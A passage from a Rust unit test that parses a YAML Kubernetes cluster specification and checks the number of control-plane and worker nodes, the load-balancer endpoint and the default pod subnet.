  - { ip: 10.0.0.20, hostname: w1 }
k8sVersion: \"1.31\"
";
        let spec: ClusterSpec = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(spec.control_plane.len(), 2);
        assert_eq!(spec.workers.len(), 1);
        assert_eq!(spec.control_plane_endpoint.as_deref(), Some("lb.exemplo.com"));
        assert_eq!(spec.pod_subnet, default_pod_subnet());
    }
}
